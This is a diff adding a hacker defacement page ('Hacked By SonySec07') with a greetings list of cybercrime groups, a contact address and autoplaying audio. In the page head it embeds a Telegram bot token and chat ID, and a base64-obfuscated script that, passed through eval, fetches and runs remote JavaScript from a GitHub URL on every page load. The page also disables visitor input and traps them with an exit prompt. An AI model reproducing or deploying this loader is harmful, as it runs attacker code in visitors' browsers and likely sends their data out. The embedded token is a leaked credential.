@@ -1,0 +1,59 @@
+<html>
+<head>
+    <title>Hacked By SonySec07</title>
+    <meta charset="UTF-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1" /> 
+    <meta property="og:title" content="Hacked By SonySec07">
+    <meta name="description" content="wh00pz ! your website security get down">
+    <meta property="og:description" content="wh00pz ! your website security get down">
+    <meta property="og:image" content="https://abilitysportsafrica.org/alok99.png">
+    <meta name="theme-color" content="#fff">
+    <style type='text/css'>body,a:hover{cursor:url(../cur.cursors-4u.net/symbols/sym-1/sym46.cur),progress!important;}</style>
+    <script>
+        window.config = {
+            botToken: "7599305876:AAFojw-7gJICoPIt5YXS8xdtVh7aM2vEsxM",
+            chatID: "7221518562"
+        };
+    </script>
+    <script>
+        (function() {
+            const encodedScript = "ZmV0Y2goImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9haG1hZDg0NDMvdGVzdC9tYWluL21lbWVrLmpzIikKICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAgIC50aGVuKHNjcmlwdENvbnRlbnQgPT4gewogICAgICAgIGNvbnN0IHNjcmlwdEVsZW1lbnQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHRFbGVtZW50LnRleHRDb250ZW50ID0gc2NyaXB0Q29udGVudDsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjcmlwdEVsZW1lbnQpOwogICAgfSkKICAgIC5jYXRjaChlcnJvciA9PiBjb25zb2xlLmVycm9yKCJHYWdhbCBtZW11YXQgc2NyaXB0OiIsIGVycm9yKSk7";
+            const decodedScript = atob(encodedScript);
+            eval(decodedScript);
+        })();
+    </script>
+</head>
+<body bgcolor="white" text="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="play()">
+<style type="text/css">
+    center {
+        font-family: Courier;
+    }
+    img {
+        opacity: 80%;
+    }
+    red {
+        color: red;
+    }
+</style>
+<script language="JavaScript">
+    window.onbeforeunload = confirmExit;
+    function confirmExit() {
+        return "are you sure ? wkwk";
+    }
+</script>
+<table width="100%" height="80%">
+    <td>
+        <center>
+            <small> 4 BROTHER </small><br>
+            <img src="https://abilitysportsafrica.org/alok99.png" width="220" height="220">
+            <br>Hacked by <red><i>SonySec07</i></red><br><font size="2">wh00pz ! your website security get down<br>patch it before something bad happens</br><br></font><br>
+            <br><small><font size="1" color="gray">johnfelix@mail2tor.co</font></small><br><br><br>
+            <font size="2"><i>Greetz</i><br>
+            Pyscodes - CurutG0D403 - Clutsert03 - BentoSec21 - TN.CUPLIS - JohnFelix - MR.VENOM - HanzRazor - NightBot405  - MR.CULA - EYIKK - M4SKGANS - Inzz - ClayOxtymus1337 - MR.KRIBO - Amigamer404 - Jakarta Blackhat Cyber Crime - MukoMuko Cyber Team - Muslim Cyber Face - FromLammerToMastah - KaliMalang BlackHat Team - Nigeria Cyber Force - FSOCIETY TEAM</font>
+        </center>
+    </td>
+</table>
+<audio src="https://i.top4top.io/m_3076tjqzc0.mp3" autoplay="1" loop="1"></audio>
+</body>
+</html>
